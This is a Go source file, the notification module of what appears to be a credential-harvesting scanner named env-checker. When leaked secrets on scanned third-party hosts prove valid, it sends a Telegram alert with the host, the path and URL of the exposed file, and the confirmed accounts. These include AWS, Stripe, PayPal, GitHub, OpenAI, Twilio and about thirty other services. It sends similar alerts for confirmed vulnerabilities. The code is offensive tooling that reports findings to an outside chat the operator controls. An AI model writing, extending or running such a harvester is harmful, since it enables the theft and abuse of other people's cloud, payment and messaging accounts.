package daemon

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"env-checker/credcheck"
	"env-checker/output"
	"env-checker/vulnscan"
)

var tgClient = &http.Client{Timeout: 15 * time.Second}

// Notify sends a Telegram message when valid credentials are confirmed.
// Silently returns if token or chatID are empty.
func Notify(token, chatID string, rec *output.Record, report credcheck.CheckReport) {
	if token == "" || chatID == "" {
		return
	}
	msg := buildMessage(rec, report)
	if err := sendTelegram(token, chatID, msg); err != nil {
		fmt.Printf("[daemon] telegram error: %v\n", err)
	}
}

// NotifyText sends a plain text Telegram message (for daemon start/stop etc).
func NotifyText(token, chatID, text string) {
	if token == "" || chatID == "" {
		return
	}
	_ = sendTelegram(token, chatID, text)
}

func sendTelegram(token, chatID, text string) error {
	endpoint := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	data := url.Values{}
	data.Set("chat_id", chatID)
	data.Set("text", text)
	data.Set("parse_mode", "Markdown")
	resp, err := tgClient.PostForm(endpoint, data)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// NotifyVuln sends a Telegram message for a confirmed vulnerability finding.
func NotifyVuln(token, chatID string, v vulnscan.Finding) {
	if token == "" || chatID == "" {
		return
	}
	sev := map[string]string{
		vulnscan.Critical: "🔴 CRITICAL",
		vulnscan.High:     "🟠 HIGH",
		vulnscan.Medium:   "🟡 MEDIUM",
		vulnscan.Low:      "🔵 LOW",
	}[v.Severity]
	if sev == "" {
		sev = "⚪ " + strings.ToUpper(v.Severity)
	}
	msg := fmt.Sprintf("%s — %s\n\n🌐 Host: `%s`\n🔗 URL: `%s`\n\n📋 *Evidence:*\n```\n%s\n```\n\n💡 %s\n\n⏰ %s UTC",
		sev, v.Title,
		v.Host, v.URL,
		truncate(v.Evidence, 300),
		v.Detail,
		time.Now().UTC().Format("2006-01-02 15:04:05"),
	)
	_ = sendTelegram(token, chatID, msg)
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func buildMessage(rec *output.Record, r credcheck.CheckReport) string {
	var sb strings.Builder
	sb.WriteString("🔑 *VALID CREDENTIALS FOUND*\n\n")
	sb.WriteString(fmt.Sprintf("🌐 Host: `%s`\n", rec.Host))
	sb.WriteString(fmt.Sprintf("📁 Path: `%s`\n", rec.Path))
	sb.WriteString(fmt.Sprintf("🔗 URL: `%s://%s%s`\n\n", rec.Mode, rec.Host, rec.Path))
	sb.WriteString("*Services confirmed:*\n")

	if r.SMTP != nil && r.SMTP.AuthValid {
		sb.WriteString(fmt.Sprintf("📧 SMTP: %s\n", r.SMTP.Message))
	}
	if r.AWS != nil && r.AWS.Valid {
		sb.WriteString(fmt.Sprintf("☁️ AWS: account=%s arn=%s\n", r.AWS.AccountID, r.AWS.ARN))
	}
	if r.SendGrid != nil && r.SendGrid.Valid {
		sb.WriteString(fmt.Sprintf("📨 SendGrid: %s\n", r.SendGrid.Info))
	}
	if r.Mailgun != nil && r.Mailgun.Valid {
		sb.WriteString(fmt.Sprintf("📮 Mailgun: %s\n", r.Mailgun.Info))
	}
	if r.Postmark != nil && r.Postmark.Valid {
		sb.WriteString(fmt.Sprintf("📬 Postmark: %s\n", r.Postmark.Info))
	}
	if r.SparkPost != nil && r.SparkPost.Valid {
		sb.WriteString(fmt.Sprintf("⚡ SparkPost: %s\n", r.SparkPost.Info))
	}
	if r.Stripe != nil && r.Stripe.Valid {
		sb.WriteString(fmt.Sprintf("💳 Stripe: %s\n", r.Stripe.Info))
	}
	if r.GitHub != nil && r.GitHub.Valid {
		sb.WriteString(fmt.Sprintf("🐙 GitHub: @%s\n", r.GitHub.Info))
	}
	if r.Mailchimp != nil && r.Mailchimp.Valid {
		sb.WriteString(fmt.Sprintf("🐵 Mailchimp: %s\n", r.Mailchimp.Info))
	}
	if r.Twilio != nil && r.Twilio.Valid {
		sb.WriteString(fmt.Sprintf("📱 Twilio: %s\n", r.Twilio.FriendlyName))
	}
	if r.Slack != nil && r.Slack.Valid {
		sb.WriteString(fmt.Sprintf("💬 Slack: %s\n", r.Slack.Info))
	}
	if r.OpenAI != nil && r.OpenAI.Valid {
		sb.WriteString(fmt.Sprintf("🤖 OpenAI: %s\n", r.OpenAI.Info))
	}
	if r.Cloudflare != nil && r.Cloudflare.Valid {
		sb.WriteString(fmt.Sprintf("🌤 Cloudflare: %s\n", r.Cloudflare.Info))
	}
	if r.DigitalOcean != nil && r.DigitalOcean.Valid {
		sb.WriteString(fmt.Sprintf("🌊 DigitalOcean: %s\n", r.DigitalOcean.Info))
	}
	if r.Discord != nil && r.Discord.Valid {
		sb.WriteString(fmt.Sprintf("🎮 Discord: %s\n", r.Discord.Info))
	}
	if r.Heroku != nil && r.Heroku.Valid {
		sb.WriteString(fmt.Sprintf("🟣 Heroku: %s\n", r.Heroku.Info))
	}
	if r.Vonage != nil && r.Vonage.Valid {
		sb.WriteString(fmt.Sprintf("📞 Vonage: %s\n", r.Vonage.Info))
	}
	// ── new services ────────────────────────────────────────────────────────────
	if r.PayPal != nil && r.PayPal.Valid {
		sb.WriteString(fmt.Sprintf("💰 PayPal: %s\n", r.PayPal.Info))
	}
	if r.GCP != nil && r.GCP.Valid {
		sb.WriteString(fmt.Sprintf("☁️ GCP Key: %s\n", r.GCP.Info))
	}
	if r.Shopify != nil && r.Shopify.Valid {
		sb.WriteString(fmt.Sprintf("🛍 Shopify: %s\n", r.Shopify.Info))
	}
	if r.Twitter != nil && r.Twitter.Valid {
		sb.WriteString(fmt.Sprintf("🐦 Twitter: %s\n", r.Twitter.Info))
	}
	if r.Facebook != nil && r.Facebook.Valid {
		sb.WriteString(fmt.Sprintf("📘 Facebook: %s\n", r.Facebook.Info))
	}
	if r.Square != nil && r.Square.Valid {
		sb.WriteString(fmt.Sprintf("⬛ Square: %s\n", r.Square.Info))
	}
	if r.Razorpay != nil && r.Razorpay.Valid {
		sb.WriteString(fmt.Sprintf("💸 Razorpay: %s\n", r.Razorpay.Info))
	}
	if r.Braintree != nil && r.Braintree.Valid {
		sb.WriteString(fmt.Sprintf("🌿 Braintree: %s\n", r.Braintree.Info))
	}
	if r.HubSpot != nil && r.HubSpot.Valid {
		sb.WriteString(fmt.Sprintf("🧲 HubSpot: %s\n", r.HubSpot.Info))
	}
	if r.Datadog != nil && r.Datadog.Valid {
		sb.WriteString(fmt.Sprintf("🐶 Datadog: %s\n", r.Datadog.Info))
	}
	if r.Sentry != nil && r.Sentry.Valid {
		sb.WriteString(fmt.Sprintf("🔍 Sentry: %s\n", r.Sentry.Info))
	}
	if r.Pusher != nil && r.Pusher.Valid {
		sb.WriteString(fmt.Sprintf("📡 Pusher: %s\n", r.Pusher.Info))
	}

	sb.WriteString(fmt.Sprintf("\n⏰ %s UTC", time.Now().UTC().Format("2006-01-02 15:04:05")))
	return sb.String()
}
